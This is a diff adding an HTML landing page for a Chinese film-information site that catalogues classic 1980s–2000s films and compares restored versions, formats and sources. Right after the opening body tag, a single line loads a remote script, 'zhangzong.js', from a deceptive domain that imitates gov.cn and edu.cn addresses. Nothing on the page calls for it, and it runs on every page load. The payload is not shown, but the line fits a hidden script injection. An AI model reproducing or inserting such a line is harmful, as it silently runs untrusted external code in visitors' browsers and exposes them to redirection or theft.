@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<title>345电影网 — 经典老片片源整理与年代观影指南</title>
+<meta name="description" content="345电影网专门整理 1980 至 2000 年代的华语经典老片与海外修复版，按年代、片种与观看条件做片源标注和观影说明，帮老影迷找到能看、看得清、看得完整的版本。">
+<meta name="keywords" content="345电影网,经典老片,华语电影年代片,修复版电影,老片片源整理,怀旧观影指南">
+<link rel="canonical" href="https://345dianyingwang-zh.github.io/">
+<style>
+:root{
+  --bg:#101318;
+  --bg-2:#161c24;
+  --card:#1b222c;
+  --line:#2a3340;
+  --txt:#e6ebf2;
+  --txt-2:#9aa7b8;
+  --txt-3:#6c7a8d;
+  --red:#d94a3c;
+  --amber:#e3a53a;
+  --teal:#3f8f8a;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.75;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+ul,ol{list-style:none}
+.wrap{max-width:1200px;margin:0 auto;padding:0 24px}
+
+/* layout: 左侧边栏 + 右侧内容 */
+.layout{display:grid;grid-template-columns:232px 1fr;gap:48px;align-items:start}
+.side{position:sticky;top:0;padding:30px 0}
+.side-brand{display:flex;flex-direction:column;gap:6px;padding-bottom:26px;border-bottom:1px solid var(--line);margin-bottom:26px}
+.side-brand b{font-size:24px;letter-spacing:1px;font-weight:800}
+.side-brand b em{font-style:normal;color:var(--red)}
+.side-brand span{font-size:12px;color:var(--txt-3);letter-spacing:2px}
+.side-nav{display:flex;flex-direction:column;gap:2px}
+.side-nav a{
+  display:flex;align-items:center;gap:12px;padding:11px 14px;border-radius:9px;
+  font-size:14.5px;color:var(--txt-2);transition:.18s;
+}
+.side-nav a:hover{background:var(--card);color:var(--txt)}
+.side-nav a.on{background:var(--red);color:#fff}
+.side-nav a i{width:6px;height:6px;border-radius:50%;background:currentColor;opacity:.5;flex:0 0 auto}
+.side-nav a.on i{opacity:1}
+.side-host{margin-top:26px;padding:16px;border:1px solid var(--line);border-radius:11px;font-size:11.5px;color:var(--txt-3);line-height:1.7}
+.side-host b{display:block;color:var(--txt-2);font-size:12px;margin-bottom:6px;letter-spacing:1px}
+
+/* content */
+main{padding:30px 0 80px;min-width:0}
+.page-title{font-size:15px;color:var(--txt-3);letter-spacing:3px;margin-bottom:12px}
+.page-h1{font-size:40px;line-height:1.25;font-weight:800;letter-spacing:-.5px;margin-bottom:18px}
+.page-h1 em{font-style:normal;color:var(--amber)}
+.lede{font-size:16.5px;color:var(--txt-2);max-width:640px}
+.kpis{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:34px}
+.kpi{border:1px solid var(--line);border-radius:12px;padding:18px;background:var(--bg-2)}
+.kpi b{display:block;font-size:27px;font-weight:800;letter-spacing:-.5px}
+.kpi span{font-size:12.5px;color:var(--txt-3);margin-top:4px;display:block}
+
+/* blocks */
+.block{border-top:1px solid var(--line);padding:64px 0 0;margin-top:64px}
+.block-head{display:flex;justify-content:space-between;align-items:baseline;gap:20px;margin-bottom:34px;flex-wrap:wrap}
+.block-head h2{font-size:27px;font-weight:800;letter-spacing:-.3px}
+.block-head .en{font-size:12px;color:var(--txt-3);letter-spacing:3px;display:block;margin-bottom:6px}
+.block-head .more{font-size:13.5px;color:var(--amber);border-bottom:1px solid rgba(227,165,58,.4);padding-bottom:2px;white-space:nowrap}
+
+/* filter tabs */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:28px}
+.tab{padding:7px 16px;border:1px solid var(--line);border-radius:30px;font-size:13.5px;color:var(--txt-2);cursor:pointer;background:transparent;transition:.18s}
+.tab:hover{border-color:var(--txt-3)}
+.tab.on{background:var(--txt);color:var(--bg);border-color:var(--txt);font-weight:600}
+
+/* film cards */
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:13px;overflow:hidden;display:flex;flex-direction:column;transition:.2s}
+.film:hover{border-color:var(--txt-3);transform:translateY(-3px)}
+.poster{height:200px;position:relative;flex:0 0 auto}
+.p1{background:linear-gradient(160deg,#3a2418,#14100c)}
+.p2{background:linear-gradient(160deg,#1c2e3a,#0c141a)}
+.p3{background:linear-gradient(160deg,#3a1c2c,#160912)}
+.p4{background:linear-gradient(160deg,#2e3a1c,#12160c)}
+.p5{background:linear-gradient(160deg,#3a3418,#1a1608)}
+.p6{background:linear-gradient(160deg,#1c3a36,#081a18)}
+.poster:after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.55))}
+.poster .yr{position:absolute;left:14px;top:14px;z-index:2;background:rgba(0,0,0,.45);backdrop-filter:blur(3px);color:#fff;font-size:12px;padding:3px 9px;border-radius:5px;font-family:ui-monospace,Menlo,monospace}
+.poster .fmt{position:absolute;right:14px;top:14px;z-index:2;background:var(--red);color:#fff;font-size:11px;padding:3px 9px;border-radius:5px;letter-spacing:.5px}
+.film-body{padding:20px;flex:1;display:flex;flex-direction:column}
+.film-body h3{font-size:19px;margin-bottom:6px}
+.film-body .meta{font-size:12.5px;color:var(--txt-3);margin-bottom:14px;display:flex;gap:10px;flex-wrap:wrap}
+.film-body p{font-size:14px;color:var(--txt-2);flex:1}
+.film-foot{display:flex;justify-content:space-between;align-items:center;margin-top:16px;padding-top:14px;border-top:1px solid var(--line);font-size:12.5px;color:var(--txt-3)}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--teal);display:inline-block;margin-right:6px}
+.dot.warn{background:var(--amber)}
+
+/* decades timeline */
+.tl{position:relative;padding-left:34px}
+.tl:before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.tl-item{position:relative;padding-bottom:34px}
+.tl-item:last-child{padding-bottom:0}
+.tl-item:before{content:"";position:absolute;left:-31px;top:7px;width:14px;height:14px;border-radius:50%;background:var(--bg);border:3px solid var(--red)}
+.tl-year{font-size:22px;font-weight:800;color:var(--amber);margin-bottom:8px;font-family:ui-monospace,Menlo,monospace}
+.tl-item h4{font-size:17px;margin-bottom:8px}
+.tl-item p{font-size:14.5px;color:var(--txt-2);max-width:760px}
+.tl-item .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
+.tl-item .tags span{font-size:12px;padding:3px 10px;border:1px solid var(--line);border-radius:5px;color:var(--txt-2)}
+
+/* source table */
+.two{display:grid;grid-template-columns:1.1fr .9fr;gap:44px;align-items:start}
+table{width:100%;border-collapse:collapse;font-size:14px}
+th,td{padding:14px 12px;text-align:left;border-bottom:1px solid var(--line)}
+th{font-size:11.5px;letter-spacing:2px;color:var(--txt-3);font-weight:600}
+td:first-child{font-weight:600}
+td .ver{display:inline-block;font-size:11.5px;padding:2px 8px;border-radius:4px;background:var(--bg-2);border:1px solid var(--line);color:var(--txt-2);margin-right:6px}
+
+/* steps */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden}
+.step{background:var(--bg-2);padding:26px 22px}
+.step b{display:block;font-size:12px;color:var(--red);letter-spacing:2px;margin-bottom:12px}
+.step h4{font-size:16.5px;margin-bottom:8px}
+.step p{font-size:13.5px;color:var(--txt-2)}
+
+/* faq */
+.faq{border:1px solid var(--line);border-radius:13px;overflow:hidden}
+details{padding:22px 24px;border-bottom:1px solid var(--line)}
+details:last-child{border-bottom:0}
+details summary{list-style:none;cursor:pointer;font-size:16px;font-weight:600;display:flex;justify-content:space-between;gap:16px;align-items:center}
+details summary::-webkit-details-marker{display:none}
+details summary:after{content:"＋";color:var(--red);font-size:18px;flex:0 0 auto}
+details[open] summary:after{content:"－"}
+details p{margin-top:14px;font-size:14.5px;color:var(--txt-2);max-width:860px}
+
+footer{border-top:1px solid var(--line);padding:56px 0 40px}
+.foot{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:40px}
+.foot b.ft-brand{font-size:21px;display:block;margin-bottom:12px}
+.foot p{font-size:13.5px;color:var(--txt-2);max-width:300px}
+.foot h5{font-size:13px;color:var(--txt);letter-spacing:2px;margin-bottom:16px}
+.foot ul{display:flex;flex-direction:column;gap:10px;font-size:13.5px}
+.foot a{color:var(--txt-2)}
+.foot a:hover{color:var(--amber)}
+.foot-bottom{margin-top:44px;padding-top:24px;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;font-size:12.5px;color:var(--txt-3)}
+.foot-host{font-family:ui-monospace,Menlo,monospace;color:var(--txt-2);background:var(--bg-2);padding:3px 9px;border-radius:6px}
+
+/* responsive */
+@media (max-width:1020px){
+  .layout{grid-template-columns:1fr;gap:0}
+  .side{position:static;padding:24px 0 0}
+  .side-nav{flex-direction:row;flex-wrap:wrap}
+  .side-nav a{flex:1 1 auto}
+  .side-host{display:none}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .two{grid-template-columns:1fr;gap:30px}
+  .foot{grid-template-columns:1fr 1fr}
+}
+@media (max-width:680px){
+  .wrap{padding:0 18px}
+  .page-h1{font-size:29px}
+  main{padding:20px 0 56px}
+  .block{padding:44px 0 0;margin-top:44px}
+  .grid,.steps{grid-template-columns:1fr}
+  .kpis{grid-template-columns:1fr 1fr}
+  .foot{grid-template-columns:1fr}
+  .block-head h2{font-size:22px}
+  table{font-size:13px}
+  th,td{padding:11px 8px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="wrap layout">
+
+  <!-- SIDEBAR -->
+  <aside class="side">
+    <div class="side-brand">
+      <b><em>345</em>电影网</b>
+      <span>CLASSIC FILM ARCHIVE</span>
+    </div>
+    <nav class="side-nav">
+      <a href="#films" class="on"><i></i>老片目录</a>
+      <a href="#decades"><i></i>年代纵览</a>
+      <a href="#source"><i></i>版本与片源</a>
+      <a href="#guide"><i></i>修复观看指引</a>
+      <a href="#faq"><i></i>常见问题</a>
+      <a href="#about"><i></i>关于本站</a>
+    </nav>
+    <div class="side-host">
+      <b>本站访问入口</b>
+      https://345dianyingwang-zh.github.io
+    </div>
+  </aside>
+
+  <!-- MAIN -->
+  <main>
+
+    <div class="page-title">FILM ARCHIVE / 1980 — 2000s</div>
+    <h1 class="page-h1">找一部<em>看得清、看得完整</em>的老片，<br>从这里开始。</h1>
+    <p class="lede">345电影网不追新片，也不做评分排行。我们专注 1980 至 2000 年代的华语经典老片与海外修复版本，把版本差异、片源状态和观看条件逐条标注，减少你“找了半天、打开却糊成一团”的浪费。</p>
+
+    <div class="kpis">
+      <div class="kpi"><b>2,800+</b><span>已收录老片条目</span></div>
+      <div class="kpi"><b>196</b><span>修复版片源记录</span></div>
+      <div class="kpi"><b>9</b><span>年代分区</span></div>
+      <div class="kpi"><b>4</b><span>内容栏目</span></div>
+    </div>
+
+    <!-- FILMS -->
+    <section class="block" id="films">
+      <div class="block-head">
+        <div>
+          <span class="en">01 / CATALOGUE</span>
+          <h2>老片目录</h2>
+        </div>
+        <a class="more" href="#">完整目录 →</a>
+      </div>
+
+      <div class="tabs">
+        <button class="tab on">全部年代</button>
+        <button class="tab">1980s</button>
+        <button class="tab">1990s</button>
+        <button class="tab">2000s</button>
+        <button class="tab">港台片</button>
+        <button class="tab">海外修复版</button>
+      </div>
+
+      <div class="grid">
+
+        <article class="film">
+          <div class="poster p1">
+            <span class="yr">1987</span><span class="fmt">4K 修复</span>
+          </div>
+          <div class="film-body">
+            <h3>红高粱</h3>
+            <div class="meta"><span>剧情 / 文艺</span><span>·</span><span>108 min</span></div>
+            <p>收录三个版本的画质与声轨对比记录，重点标注第五代导演早期的色彩风格与胶片颗粒在不同修复源下的差异。</p>
+            <div class="film-foot"><span><i class="dot"></i>片源已核对</span><span>条目 No.0187</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster p2">
+            <span class="yr">1994</span><span class="fmt">2K 修复</span>
+          </div>
+          <div class="film-body">
+            <h3>活着</h3>
+            <div class="meta"><span>年代 / 家庭</span><span>·</span><span>133 min</span></div>
+            <p>因发行范围有限，修复版与电视版的镜头处理存在差异。条目内附不同版本的时长与段落对照，方便按需选择。</p>
+            <div class="film-foot"><span><i class="dot"></i>片源已核对</span><span>条目 No.0241</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster p3">
+            <span class="yr">1996</span><span class="fmt">DVDRip</span>
+          </div>
+          <div class="film-body">
+            <h3>甜蜜蜜</h3>
+            <div class="meta"><span>爱情 / 剧情</span><span>·</span><span>118 min</span></div>
+            <p>市面流传的版本以 DVD 转录为主，音轨混音质量参差不齐。条目给出字幕时序与音画同步的具体注意事项。</p>
+            <div class="film-foot"><span><i class="dot warn"></i>片源待更新</span><span>条目 No.0308</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster p4">
+            <span class="yr">2002</span><span class="fmt">2K 修复</span>
+          </div>
+          <div class="film-body">
+            <h3>无间道</h3>
+            <div class="meta"><span>犯罪 / 港片</span><span>·</span><span>101 min</span></div>
+            <p>收录港版与国际版在片长、配乐与字幕三处的差异。修复版在暗部细节上有明显提升，适合在大屏上重看。</p>
+            <div class="film-foot"><span><i class="dot"></i>片源已核对</span><span>条目 No.0516</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster p5">
+            <span class="yr">1999</span><span class="fmt">VHS 转录</span>
+          </div>
+          <div class="film-body">
+            <h3>一个都不能少</h3>
+            <div class="meta"><span>现实题材</span><span>·</span><span>106 min</span></div>
+            <p>仅存的较完整转录源来自早期录像带，画质损失较大但保留原始对白与现场收音。条目内已标注建议的观看设备。</p>
+            <div class="film-foot"><span><i class="dot warn"></i>片源待更新</span><span>条目 No.0472</span></div>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="poster p6">
+            <span class="yr">2000</span><span class="fmt">4K 修复</span>
+          </div>
+          <div class="film-body">
+            <h3>花样年华</h3>
+            <div class="meta"><span>文艺 / 港片</span><span>·</span><span>98 min</span></div>
+            <p>修复版在色调还原上做了重新调校，色温更接近原始胶片意图。条目附不同版本的色彩差异截图对照。</p>
+            <div class="film-foot"><span><i class="dot"></i>片源已核对</span><span>条目 No.0583</span></div>
+          </div>
+        </article>
+
+      </div>
+    </section>
+
+    <!-- DECADES -->
+    <section class="block" id="decades">
+      <div class="block-head">
+        <div>
+          <span class="en">02 / DECADES</span>
+          <h2>年代纵览</h2>
+        </div>
+        <a class="more" href="#">年代索引 →</a>
+      </div>
+
+      <div class="tl">
+
+        <div class="tl-item">
+          <div class="tl-year">1980 — 1984</div>
+          <h4>解冻期：题材打开，胶片记录尚不完整</h4>
+          <p>这一阶段的影片以现实主义与反思题材为主，胶片的保存状态普遍不理想。大量作品只留下残缺的转录版本，甚至仅有片段与剧照留存。本站优先收录有完整声轨记录的条目。</p>
+          <div class="tags"><span>现实主义</span><span>胶片残缺</span><span>声轨不完整</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-year">1985 — 1989</div>
+          <h4>第五代登场：影像语言开始被重视</h4>
+          <p>导演开始把影像本身当作叙事手段，构图、色彩与空间处理有了明确意图。这给后来的修复工作留出了较大的还原空间，也意味着“随手转录”最容易损失的部分正是作品的核心。</p>
+          <div class="tags"><span>第五代</span><span>影像叙事</span><span>修复潜力大</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-year">1990 — 1994</div>
+          <h4>商业类型片成型，合拍片出现</h4>
+          <p>港台与内地合拍模式增多，类型片开始形成稳定的制作套路。这一阶段的版本差异往往来自发行地区与审查环节的剪辑，同一个片名可能存在多个实际内容不同的版本。</p>
+          <div class="tags"><span>合拍片</span><span>多版本并存</span><span>剪辑差异</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-year">1995 — 1999</div>
+          <h4>港片黄金尾声，内地市场加速扩张</h4>
+          <p>香港类型片在这一阶段进入高强度生产期，母带保存情况参差；同期内地电影开始尝试更大的制作规模，画幅与声轨格式逐渐标准化，便于后期数字化处理。</p>
+          <div class="tags"><span>港片尾声</span><span>母带参差</span><span>声轨标准化</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-year">2000 — 2009</div>
+          <h4>数字化过渡期，版本混乱的高峰</h4>
+          <p>从胶片到数字拍摄的过渡阶段，同一部片子可能同时存在胶片扫描版、数字母版与电视播出版。这是目前版本标注最复杂的一批，也是本站投入篇幅最多的分区。</p>
+          <div class="tags"><span>数字化过渡</span><span>版本复杂</span><span>重点标注</span></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- SOURCE -->
+    <section class="block" id="source">
+      <div class="block-head">
+        <div>
+          <span class="en">03 / VERSIONS</span>
+          <h2>版本与片源</h2>
+        </div>
+        <a class="more" href="#">版本对照表 →</a>
+      </div>
+
+      <div class="two">
+        <div>
+          <table>
+            <thead>
+              <tr><th>版本标识</th><th>画质表现</th><th>音轨</th><th>建议用途</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><span class="ver">4K 修复</span></td><td>细节完整，噪点控制较好</td><td>原始声轨还原</td><td>大屏与投影观看</td></tr>
+              <tr><td><span class="ver">2K 修复</span></td><td>清晰度足够，暗部略平</td><td>多语言可选</td><td>普通显示器观看</td></tr>
+              <tr><td><span class="ver">DVD 转录</span></td><td>受母盘质量影响大</td><td>混音版本不统一</td><td>补看冷门条目</td></tr>
+              <tr><td><span class="ver">VHS 转录</span></td><td>明显损失，存在色偏</td><td>多为单声道</td><td>史料与对照研究</td></tr>
+              <tr><td><span class="ver">电视播出版</span></td><td>被压缩，有台标与剪辑</td><td>重新配音风险</td><td>仅作检索参照</td></tr>
+            </tbody>
+          </table>
+          <p style="font-size:13px;color:var(--txt-3);margin-top:16px">表格中的“建议用途”是观看体验层面的提示，不构成对作品质量的评价；片源状态会随修复进展更新。</p>
+        </div>
+
+        <div>
+          <div class="block-head" style="margin-bottom:20px"><div><span class="en">NOTE</span><h2 style="font-size:21px">为什么同一部片看起来不一样</h2></div></div>
+          <ul style="display:flex;flex-direction:column;gap:18px;font-size:14.5px;color:var(--txt-2)">
+            <li><strong style="color:var(--txt)">修复取向不同：</strong>有的修复偏向还原原始胶片质感，有的偏向现代观感，二者在锐度与颗粒度上差别明显。</li>
+            <li><strong style="color:var(--txt)">母带来源不同：</strong>发行拷贝、宣传拷贝与导演保存版本可能各自独立，色彩与片长都可能存在出入。</li>
+            <li><strong style="color:var(--txt)">发行地区不同：</strong>港台版与内地版常有剪辑与时长差异，不能以片名直接等同内容。</li>
+            <li><strong style="color:var(--txt)">转录链路不同：</strong>转录设备的档次、压缩参数与字幕烧录方式，会进一步拉开观看体验的差距。</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- GUIDE -->
+    <section class="block" id="guide">
+      <div class="block-head">
+        <div>
+          <span class="en">04 / GUIDE</span>
+          <h2>修复观看指引</h2>
+        </div>
+        <a class="more" href="#">完整指引 →</a>
+      </div>
+
+      <div class="steps">
+        <div class="step">
+          <b>STEP 01</b>
+          <h4>先确认版本</h4>
+          <p>看片名与年份只能确认作品，不能确认你手上的是哪一个版本。先核对片长、声轨与发行地区。</p>
+        </div>
+        <div class="step">
+          <b>STEP 02</b>
+          <h4>再看画质规格</h4>
+          <p>4K 修复在大屏上优势明显，小尺寸移动设备上看不出差别，不必为规格多花时间寻找。</p>
+        </div>
+        <div class="step">
+          <b>STEP 03</b>
+          <h4>匹配观看设备</h4>
+          <p>VHS 转录与电视播出版更适合在小尺寸屏幕上观看，放大后只会暴露更多瑕疵。</p>
+        </div>
+        <div class="step">
+          <b>STEP 04</b>
+          <h4>留意声轨与时序</h4>
+          <p>老片的字幕时序与音画同步问题最常见，提前检查能避免观看中途频繁调整进度。</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="block" id="faq">
+      <div class="block-head">
+        <div>
+          <span class="en">05 / FAQ</span>
+          <h2>常见问题</h2>
+        </div>
+      </div>
+
+      <div class="faq">
+        <details open>
+          <summary>345电影网和一般的电影资讯站有什么不同？</summary>
+          <p>我们不做新片资讯、评分排行与影评输出，也不追踪热搜。站内的核心内容是老片的版本差异与片源状态记录，服务对象是希望找对版本、看完整一部老片的人。</p>
+        </details>
+        <details>
+          <summary>“4K 修复”是否等于“原版还原”？</summary>
+          <p>不等于。修复是对原始素材的处理结果，不同团队的取向可能完全相反：有的保留颗粒与胶片质感，有的追求现代观感的清晰度。同一部作品的不同修复版本，视觉上可以相差很大。</p>
+        </details>
+        <details>
+          <summary>为什么有些条目标着“片源待更新”？</summary>
+          <p>老片的母带保存情况不一，部分作品目前只有低质量的转录源。标注“待更新”表示我们仍在追踪修复与发行信息，不会用高质量标识误导读者。</p>
+        </details>
+        <details>
+          <summary>片源记录多久更新一次？</summary>
+          <p>修复版与发行信息不按固定周期出现，所以本站以“事件触发”方式更新：有新修复版、新发行或发现此前标注有误时，直接修订条目并保留修订记录。</p>
+        </details>
+        <details>
+          <summary>能否提供老片资源下载？</summary>
+          <p>本站只做版本信息的整理与标注，不提供任何影片文件的存储、托管或下载服务，也不指向相关来源。请通过合法渠道获取影片。</p>
+        </details>
+      </div>
+    </section>
+
+    <!-- ABOUT -->
+    <section class="block" id="about">
+      <div class="block-head">
+        <div>
+          <span class="en">06 / ABOUT</span>
+          <h2>关于本站</h2>
+        </div>
+      </div>
+
+      <div class="two">
+        <div>
+          <p style="font-size:15.5px;color:var(--txt-2);margin-bottom:16px">345电影网由几位长期做影片资料整理的人维护，起因是我们自己在找老片时反复踩坑：片名相同但版本不同，标着“高清”实际是压缩后的电视播出版，写着“修复版”却改了色彩取向。</p>
+          <p style="font-size:15.5px;color:var(--txt-2);margin-bottom:16px">我们因此把“版本是什么、状态如何、适合怎么看”拆开记录。这里没有流量焦虑，也没有日更压力，更新速度慢但标注尽量说得清出处。</p>
+          <p style="font-size:15.5px;color:var(--txt-2)">如果你手上有更完整或更早的版本信息，欢迎通过下方的渠道补正，核实后会标注来源并修订条目。</p>
+        </div>
+        <div style="border:1px solid var(--line);border-radius:13px;padding:26px">
+          <h4 style="font-size:17px;margin-bottom:18px">基本信息</h4>
+          <ul style="display:flex;flex-direction:column;gap:14px;font-size:14px;color:var(--txt-2)">
+            <li><strong style="color:var(--txt)">站点名称</strong>　345电影网</li>
+            <li><strong style="color:var(--txt)">网站网址</strong>　https://345dianyingwang-zh.github.io</li>
+            <li><strong style="color:var(--txt)">栏目构成</strong>　老片目录 / 年代纵览 / 版本与片源 / 关于本站</li>
+            <li><strong style="color:var(--txt)">收录范围</strong>　1980—2000s 华语经典与海外修复版</li>
+            <li><strong style="color:var(--txt)">更新方式</strong>　事件触发，不保证固定频率</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <b class="ft-brand"><span style="color:var(--red)">345</span>电影网</b>
+        <p>只做一件事：让老片找得到、看得清、看得完整。一个关于版本与片源的小站。</p>
+      </div>
+      <div>
+        <h5>内容栏目</h5>
+        <ul>
+          <li><a href="#films">老片目录</a></li>
+          <li><a href="#decades">年代纵览</a></li>
+          <li><a href="#source">版本与片源</a></li>
+          <li><a href="#guide">修复观看指引</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>年代索引</h5>
+        <ul>
+          <li><a href="#">1980s 专区</a></li>
+          <li><a href="#">1990s 专区</a></li>
+          <li><a href="#">2000s 专区</a></li>
+          <li><a href="#">海外修复版</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>站点说明</h5>
+        <ul>
+          <li><a href="#about">关于本站</a></li>
+          <li><a href="#">纠错与补正</a></li>
+          <li><a href="#">转载说明</a></li>
+          <li><a href="#">联系方式</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <span>© 2026 345电影网 · 网站网址：https://345dianyingwang-zh.github.io · 本站仅做影片信息整理，不提供任何影片文件下载服务。</span>
+      <span>经典老片 · 版本记录 · 片源标注</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var tabs=document.querySelectorAll('.tab');
+  for(var i=0;i<tabs.length;i++){
+    tabs[i].addEventListener('click',function(){
+      for(var j=0;j<tabs.length;j++){tabs[j].classList.remove('on');}
+      this.classList.add('on');
+    });
+  }
+  var links=document.querySelectorAll('.side-nav a');
+  for(var k=0;k<links.length;k++){
+    links[k].addEventListener('click',function(){
+      for(var m=0;m<links.length;m++){links[m].classList.remove('on');}
+      this.classList.add('on');
+    });
+  }
+})();
+</script>
+</body>
+</html>
